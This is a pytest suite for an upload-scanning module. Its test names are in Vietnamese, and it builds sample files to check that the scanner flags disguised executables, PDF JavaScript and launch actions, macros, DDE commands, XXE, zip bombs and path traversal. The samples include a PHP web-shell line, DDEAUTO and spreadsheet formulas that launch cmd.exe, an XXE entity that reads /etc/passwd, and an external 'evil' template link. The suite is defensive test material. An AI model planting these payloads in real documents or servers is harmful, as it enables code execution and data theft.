# SPDX-FileCopyrightText: 2026 DX-OS Open-Core contributors
#
# SPDX-License-Identifier: Apache-2.0

import io
import struct
import zipfile
import zlib

import pytest

from app import scanner

PDF = "application/pdf"
PNG = "image/png"
JPEG = "image/jpeg"
DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
XLSX = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
TXT = "text/plain"
MZ = b"MZ" + b"\x90" * 58 + b"\x80\x00\x00\x00" + b"\x00" * 64 + b"PE\x00\x00" + b"\x00" * 100 + b"This program cannot be run in DOS mode."


def png(trailing: bytes = b"", bad_crc: bool = False, chunk: bytes = b"IDAT") -> bytes:
    def part(kind: bytes, body: bytes) -> bytes:
        crc = zlib.crc32(kind + body) & 0xFFFFFFFF
        return struct.pack(">I", len(body)) + kind + body + struct.pack(">I", crc ^ (1 if bad_crc else 0))

    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    return (
        scanner.PNG_SIGNATURE + part(b"IHDR", ihdr) + part(chunk, zlib.compress(b"\x00\xff\x00\x00")) + part(b"IEND", b"")
        + trailing
    )


def jpeg(trailing: bytes = b"") -> bytes:
    return b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" + b"\x12\x34" * 40 + b"\xff\xd9" + trailing


def pdf(extra: str = "", stream: bytes | None = None, encrypt: bool = False) -> bytes:
    body = f"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R {extra} >>\nendobj\n"
    if stream is not None:
        packed = zlib.compress(stream)
        body += f"2 0 obj\n<< /Length {len(packed)} /Filter /FlateDecode >>\nstream\n"
        return (body.encode() + packed + b"\nendstream\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n")
    trailer = "/Encrypt 9 0 R " if encrypt else ""
    return (body + f"trailer\n<< /Root 1 0 R {trailer}>>\n%%EOF\n").encode()


def ooxml(kind: str = "docx", extra: dict[str, bytes] | None = None, document: bytes = b"<w:document/>") -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml" if kind == "docx" else "xl/workbook.xml", document)
        for name, body in (extra or {}).items():
            z.writestr(name, body)
    return buf.getvalue()


def verdict(content_type: str, data: bytes) -> tuple[str, list[str]]:
    report = scanner.scan_file(content_type, data)
    return report.verdict, [f.code for f in report.findings]


def test_tep_sach_duoc_xac_nhan_sau_khi_quet():
    for content_type, data in (
        (PNG, png()),
        (JPEG, jpeg()),
        (PDF, pdf()),
        (PDF, pdf(stream=b"BT /F1 12 Tf (Xin chao) Tj ET")),
        (DOCX, ooxml("docx")),
        (XLSX, ooxml("xlsx", document=b"<workbook/>")),
        (TXT, "Báo giá linh kiện: 1.200.000 đồng".encode()),
        (DOCX, ooxml("docx", {"word/_rels/document.xml.rels": b'<Relationships><Relationship Id="1" Type="http://x/hyperlink" Target="https://vfossa.vn" TargetMode="External"/></Relationships>'})),
    ):
        report = scanner.scan_file(content_type, data)
        assert report.verdict == "CLEAN", (content_type, report.as_dict())
        assert report.engines and report.checked, "tệp sạch phải ghi rõ đã quét bằng gì và kiểm tra gì"
        assert "Đã quét xong" in report.summary()


def test_chu_ky_thu_nghiem_eicar():
    for content_type, data in ((TXT, scanner.EICAR), (PDF, pdf(stream=scanner.EICAR)), (PNG, png(trailing=scanner.EICAR)),
                               (DOCX, ooxml("docx", {"word/media/a.txt": scanner.EICAR}))):
        assert scanner.scan_file(content_type, data).verdict == "INFECTED", content_type


def test_tep_thuc_thi_nguy_trang():
    assert verdict(TXT, MZ)[0] == "INFECTED"
    assert verdict(PNG, png(trailing=MZ))[0] == "INFECTED"
    assert verdict(JPEG, jpeg(trailing=MZ))[0] == "INFECTED"
    assert verdict(DOCX, ooxml("docx", {"word/media/image1.png": MZ}))[0] == "INFECTED"
    assert "dangerous-file" in verdict(DOCX, ooxml("docx", {"word/run.exe": b"x"}))[1]


def test_pdf_ma_chu_dong_va_che_ten():
    assert "pdf-javascript" in verdict(PDF, pdf("/Names << /JavaScript 5 0 R >>"))[1]
    assert "pdf-javascript" in verdict(PDF, pdf("/AA << /O << /S /Java#53cript /JS (app.alert(1)) >> >>"))[1], "tên che bằng #xx"
    assert "pdf-launch" in verdict(PDF, pdf("/OpenAction << /S /Launch /F (cmd.exe) >>"))[1]
    assert "pdf-embeddedfile" in verdict(PDF, pdf("/Names << /EmbeddedFiles 3 0 R /Type /EmbeddedFile >>"))[1]
    assert "pdf-encrypt" in verdict(PDF, pdf(encrypt=True))[1], "PDF mã hóa không quét được nên không sạch"
    hidden = zlib.compress(b"<< /S /JavaScript /JS (app.alert(1)) >>")
    obj_stream = b"%PDF-1.7\n3 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode >>\nstream\n" + hidden + b"\nendstream\nendobj\n%%EOF\n"
    assert "pdf-javascript" in verdict(PDF, obj_stream)[1], "JavaScript giấu trong luồng đối tượng nén"
    assert verdict(PDF, pdf("/OpenAction [1 0 R /Fit]"))[0] == "CLEAN", "OpenAction chuyển trang thì chỉ cảnh báo"


def test_cau_truc_anh():
    assert "png-crc" in verdict(PNG, png(bad_crc=True))[1]
    assert "png-trailing" in verdict(PNG, png(trailing=b"data bi giau" * 4))[1]
    assert "png-chunk" in verdict(PNG, png(chunk=b"ABCD"))[1], "chunk bắt buộc lạ"
    assert "png-truncated" in verdict(PNG, png()[:-9])[1]
    assert "jpeg-trailing" in verdict(JPEG, jpeg(trailing=b"x" * 200))[1]
    assert "embedded-script" in verdict(JPEG, jpeg(trailing=b"<?php system($_GET[1]); ?>"))[1]
    assert verdict(JPEG, b"\xff\xd8\xff\xe0" + b"\x00" * 50)[0] == "REJECTED", "JPEG thiếu EOI"


def test_office_macro_nhung_lien_ket_ngoai():
    assert "macro" in verdict(DOCX, ooxml("docx", {"word/vbaProject.bin": b"\xd0\xcf\x11\xe0"}))[1]
    assert "embedded-object" in verdict(DOCX, ooxml("docx", {"word/embeddings/oleObject1.bin": b"abcd"}))[1]
    rels = b'<Relationships><Relationship Id="1" Type="http://x/attachedTemplate" Target="https://evil/t.dotm" TargetMode="External"/></Relationships>'
    assert "rel-external" in verdict(DOCX, ooxml("docx", {"word/_rels/settings.xml.rels": rels}))[1]
    unc = b'<Relationships><Relationship Id="1" Type="http://x/image" Target="file:///\\\\\\\\server\\\\share\\\\a.png" TargetMode="External"/></Relationships>'
    assert "rel-local" in verdict(DOCX, ooxml("docx", {"word/_rels/document.xml.rels": unc}))[1]
    assert "xxe" in verdict(DOCX, ooxml("docx", document=b'<!DOCTYPE d [<!ENTITY x SYSTEM "file:///etc/passwd">]><w:document>&x;</w:document>'))[1]
    assert verdict(DOCX, ooxml("docx", document=b'<w:document><w:instrText>DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"</w:instrText></w:document>'))[0] == "INFECTED"
    sheet = b"<worksheet><f>cmd|' /C calc'!A0</f></worksheet>"
    assert verdict(XLSX, ooxml("xlsx", {"xl/worksheets/sheet1.xml": sheet}, document=b"<workbook/>"))[0] == "INFECTED"


def test_chu_trong_noi_dung_khong_bi_bao_nham_la_dde():
    prose = b"<w:document><w:t>Chay lenh cmd.exe /c hoac powershell - o dong lenh; DDE la gi?</w:t></w:document>"
    assert verdict(DOCX, ooxml("docx", document=prose))[0] == "CLEAN", "chữ trong nội dung văn bản không phải trường lệnh"


def test_zip_nguy_hiem():
    assert "zip-path" in verdict(DOCX, ooxml("docx", {"../../evil.xml": b"x"}))[1]
    assert "ooxml-structure" in verdict(DOCX, ooxml("xlsx", document=b"<workbook/>"))[1], "xlsx giả làm docx"
    assert "zip-bad" in verdict(DOCX, b"PK\x03\x04" + b"\x00" * 100)[1]
    bomb = ooxml("docx", {"word/media/zero.bin": b"\x00" * (60 * 1024 * 1024)})
    assert len(bomb) < 1024 * 1024 and "zip-bomb" in verdict(DOCX, bomb)[1]
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/media/inner.zip", b"PK\x03\x04" + b"\x00" * 30)
    assert "nested-zip" in verdict(DOCX, buf.getvalue())[1]


def test_van_ban_khong_phai_van_ban():
    assert "binary-text" in verdict(TXT, b"abc\x00def")[1]
    assert "control-chars" in verdict(TXT, bytes(range(1, 9)) * 30 + b"abc")[1]
    assert verdict(TXT, "Tiếng Việt có dấu\nDòng hai\tTab".encode())[0] == "CLEAN"
    assert verdict(TXT, "Cong hoa xa hoi".encode("cp1258"))[0] == "CLEAN"


def test_khong_quet_het_thi_khong_sach():
    report = scanner.scan_file(PDF, pdf(stream=b"x" * 1000), budget=-1)
    assert report.verdict == "REJECTED" and "scan-incomplete" in [f.code for f in report.findings]
    assert scanner.scan_file("application/zip", b"PK\x03\x04").verdict == "REJECTED", "loại chưa có bộ kiểm tra"


@pytest.mark.parametrize("content_type", [PDF, PNG, JPEG, DOCX, XLSX, TXT])
def test_du_lieu_rac_khong_lam_hong_bo_quet(content_type):
    for junk in (b"", b"\x00" * 10, b"\xff" * 5000, bytes(range(256)) * 20):
        report = scanner.scan_file(content_type, junk)
        assert report.verdict in ("CLEAN", "REJECTED", "INFECTED")
        if content_type != TXT:
            assert report.verdict != "CLEAN", (content_type, junk[:8])
